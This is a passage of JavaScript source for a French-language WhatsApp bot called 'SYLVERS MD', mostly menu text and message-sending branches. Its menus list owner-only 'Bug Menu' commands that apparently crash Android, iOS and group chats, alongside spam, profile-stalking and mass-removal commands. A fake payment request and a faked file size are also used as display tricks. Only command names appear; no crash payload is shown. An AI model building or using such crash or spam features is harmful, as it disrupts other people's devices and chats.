│${setv} │${prefix}animeshinobu 🅡
│${setv} │${prefix}animehandhold 🅡
│${setv} │${prefix}animehighfive 🅡
│${setv} │${prefix}animecringe 🅡
│${setv} │${prefix}animedance 🅡
│${setv} │${prefix}animehappy 🅡
│${setv} │${prefix}animeglomp 🅡
│${setv} │${prefix}animeblush 🅡
│${setv} │${prefix}animesmug 🅡
│${setv} │${prefix}animewave 🅡
│${setv} │${prefix}animesmille 🅡
│${setv} │${prefix}animepoke 🅡
│${setv} │${prefix}animewink 🅡
│${setv} │${prefix}animebonk 🅡
│${setv} │${prefix}animebully 🅡
│${setv} │${prefix}animeyeet 🅡
│${setv} │${prefix}animebite 🅡
│${setv} │${prefix}animelick 🅡
│${setv} │${prefix}animekill 🅡
│${setv} │${prefix}animecry 🅡
│${setv} │${prefix}animewlp 🅡
│${setv} │${prefix}animekiss 🅡
│${setv} │${prefix}animehug 🅡
│${setv} │${prefix}animeneko 🅡
│${setv} │${prefix}animepat 🅡
│${setv} │${prefix}animeslap 🅡
│${setv} │${prefix}animecuddle 🅡
│${setv} │${prefix}animewaifu 🅡
│${setv} │${prefix}animenom 🅡
│${setv} │${prefix}animefoxgirl 🅡
│${setv} │${prefix}animegecg 🅡
│${setv} │${prefix}animetickle 🅡
│${setv} │${prefix}animefeed 🅡
│${setv} │${prefix}animeavatar 🅡
│${setv} │${prefix}anime 🅡
│${setv} │${prefix}avatar 🅡
│${setv} │${prefix}shinobu 🅡
│${setv} │${prefix}fox_girl 🅡
│${setv} │${prefix}gecg 🅡
│${setv} ╰───────────╯
╰──────────────────╯
╭─✣「 *Anime -18* 」✣───╮
│${setv} ╭───────────╮
│${setv} │${prefix}hentai 🅡
│${setv} │${prefix}gifblowjob 🅡
│${setv} │${prefix}hentaivid 🅡
│${setv} │${prefix}hneko 🅡
│${setv} │${prefix}nwaifu 🅡
│${setv} │${prefix}animespank 🅡
│${setv} │${prefix}trap 🅡
│${setv} │${prefix}blowjob 🅡
│${setv} │${prefix}cuckold 🅡
│${setv} │${prefix}milf 🅡
│${setv} │${prefix}eba 🅡
│${setv} │${prefix}pussy 🅡
│${setv} │${prefix}yuri 🅡
│${setv} │${prefix}zettai 🅡
│${setv} ╰──────────╯
╰─────────────────╯
╭─✣「 *Database* 」✣───╮
│${setv} ╭──────────╮
│${setv} │${prefix}mod-cmd 🅟
│${setv} │${prefix}supp-cmd 🅟
│${setv} │${prefix}liste-cmd 🅡
│${setv} │${prefix}bloquer-cmd 🅟
│${setv} │${prefix}add-msg 🅟
│${setv} │${prefix}supp-msg 🅟
│${setv} │${prefix}voir-msg 🅡
│${setv} │${prefix}liste-msg 🅡
│${setv} ╰──────────╯
╰─────────────────╯
╭─✣「 *Bug Menu* 」✣────╮
│${setv} ╭────────────╮
│${setv} │${prefix}sylvers-droid 🅟
│${setv} │${prefix}sylvers-droid2 🅟
│${setv} │${prefix}sylvers-ios 🅟
│${setv} │${prefix}sylvers-ios2 🅟
│${setv} │${prefix}systemuicrash 🅟
│${setv} │${prefix}kamusari 🅟
│${setv} │${prefix}neidy 🅟
│${setv} │${prefix}kenv 🅟
│${setv} │${prefix}sylvers-ios3 🅟
│${setv} │${prefix}sylvers-all 🅟
│${setv} │${prefix}sylvers-buggroupe 🅟
│${setv} ╰──────────╯
╰─────────────────╯
╭─✣「 *Divers* 」✣─────╮
│${setv} ╭──────────╮
│${setv} │${prefix}update 🅡
│${setv} │${prefix}ping 🅡
│${setv} │${prefix}menu 🅡
│${setv} │${prefix}mon-ip 🅡
│${setv} │${prefix}repo 🅡
│${setv} │${prefix}requete 🅡
│${setv} │${prefix}id-group 🅡
│${setv} │${prefix}proprio 🅡
│${setv} │${prefix}rentbot 🅡
│${setv} │${prefix}don 🅡
│${setv} │${prefix}temps-actif 🅡
│${setv} │${prefix}confession 🅡
│${setv} │${prefix}react 🅡
│${setv} │${prefix}q 🅡
│${setv} │${prefix}inspect 🅡
│${setv} │${prefix}tag-moi 🅡
│${setv} │${prefix}tiktokstalk 🅡
│${setv} │${prefix}mlstalk 🅡
│${setv} │${prefix}npmstalk 🅡
│${setv} │${prefix}ghstalk 🅡
│${setv} │${prefix}bible 🅡
│${setv} │${prefix}quran 🅡
│${setv} │${prefix}gita 🅡
│${setv} │${prefix}list 🅡
│${setv} │${prefix}store 🅡
│${setv} │${prefix}shop 🅡
│${setv} │${prefix}addlist 🅟
│${setv} │${prefix}dellist 🅟
│${setv} ╰─────────╯
╰────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-proprio': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣──╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Proprio* 」✣─────╮
│${setv} ╭────────────╮
│${setv} │${prefix}add-grosmot 🅟
│${setv} │${prefix}supp-grosmot 🅟
│${setv} │${prefix}lecture-auto 🅟
│${setv} │${prefix}auto-bio 🅟
│${setv} │${prefix}ecriture-auto 🅟
│${setv} │${prefix}indisponible 🅟
│${setv} │${prefix}reg-auto 🅟
│${setv} │${prefix}reg-ecritureauto 🅟
│${setv} │${prefix} lecture-statut auto 🅟
│${setv} │${prefix}mod-blocageauto 🅟
│${setv} │${prefix}mod-antiforeign 🅟
│${setv} │${prefix}blocage-auto 🅟
│${setv} │${prefix}groupe-unik 🅟
│${setv} │${prefix}pv-unik 🅟
│${setv} │${prefix}anti-appel 🅟
│${setv} │${prefix}privey 🅟
│${setv} │${prefix}publique 🅟
│${setv} │${prefix}rejoindre 🅟
│${setv} │${prefix}poll 🅟
│${setv} │${prefix}spam 🅟
│${setv} │${prefix}bc 🅟
│${setv} │${prefix}broadcast-griupe🅟
│${setv} │${prefix}mod-menu 🅟
│${setv} │${prefix}mod-imgmenu 🅟
│${setv} │${prefix}mod-vidmenu 🅟
│${setv} │${prefix}mod-gifmenu 🅟
│${setv} │${prefix}mod-reponse 🅟
│${setv} │${prefix}creer-groupe 🅟
│${setv} │${prefix}mod-exif 🅟
│${setv} │${prefix}voir-exif 🅟
│${setv} │${prefix}getautoblocknumber 🅟
│${setv} │${prefix}getantiforeignnumber 🅟
│${setv} │${prefix}userjid 🅟
│${setv} │${prefix}mod-botbio 🅟
│${setv} │${prefix}supp-ppbot 🅟
│${setv} │${prefix}extinction 🅟
│${setv} │${prefix}mod-ppbot 🅟
│${setv} │${prefix}add-boss 🅟
│${setv} │${prefix}supp-boss 🅟
│${setv} │${prefix}add-proprio 🅟
│${setv} │${prefix}supp-proprio 🅟
│${setv} │${prefix}statut-texte 🅟
│${setv} │${prefix}statut-video 🅟
│${setv} │${prefix}statut-image 🅟
│${setv} │${prefix}statut-audio 🅟
│${setv} │${prefix}auto-sticker 🅟
│${setv} │${prefix}bloquer 🅟
│${setv} │${prefix}debloquer 🅟
│${setv} │${prefix}quitter 🅟
│${setv} │${prefix}checkmember 🅟
│${setv} │${prefix}post 🅟
│${setv} │${prefix}tout-effacer 🅟
│${setv} │${prefix}mod-prefix 🅟
│${setv} │$ 🅟
│${setv} │> 🅟
│${setv} │ < 🅟
│${setv} ╰────────────╯
╰───────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-groupe': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Groupe* 」✣─────╮
│${setv} ╭────────────╮
│${setv} │${prefix}anti-bot 🅖
│${setv} │${prefix}anti-vueunique 🅖
│${setv} │${prefix}vv 🅖
│${setv} │${prefix}bienvenue 🅖
│${setv} │${prefix}admin-event 🅖
│${setv} │${prefix}groupe-vent 🅖
│${setv} │${prefix}anti-foreign 🅖
│${setv} │${prefix}anti-media 🅖
│${setv} │${prefix}anti-audio 🅖
│${setv} │${prefix}anti-video 🅖
│${setv} │${prefix}anti-image 🅖
│${setv} │${prefix}anti-document 🅖
│${setv} │${prefix}anti-localisation 🅖
│${setv} │${prefix}anti-contact 🅖
│${setv} │${prefix}anti-sticker 🅖
│${setv} │${prefix}anti-poll 🅖
│${setv} │${prefix}anti-lien 🅖
│${setv} │${prefix}anti-promotion 🅖
│${setv} │${prefix}anti-virtex 🅖
│${setv} │${prefix}lien 🅖
│${setv} │${prefix}liste-admin 🅖
│${setv} │${prefix}inviter 🅖
│${setv} │${prefix}ephemere 🅖
│${setv} │${prefix}supprimer 🅖
│${setv} │${prefix}mod-ppgroup 🅖
│${setv} │${prefix}supp-ppgroup 🅖
│${setv} │${prefix}mod-nomgroupe 🅖
│${setv} │${prefix}mod-desc 🅖
│${setv} │${prefix}ajouter 🅖
│${setv} │${prefix}retirer 🅖
│${setv} │${prefix}nommer 🅖
│${setv} │${prefix}demettre 🅖
│${setv} │${prefix}tous-dehors 🅖
│${setv} │${prefix}nominations🅖
│${setv} │${prefix}denominations🅖
│${setv} │${prefix}voir-contact 🅟
│${setv} │${prefix}reg-contact 🅟
│${setv} │${prefix}send-contact 🅟
│${setv} │${prefix}conta-ctag 🅟
│${setv} │${prefix}ecoutez 🅖
│${setv} │${prefix}totag 🅖
│${setv} │${prefix}chers-tous 🅖
│${setv} │${prefix}mod-info 🅖
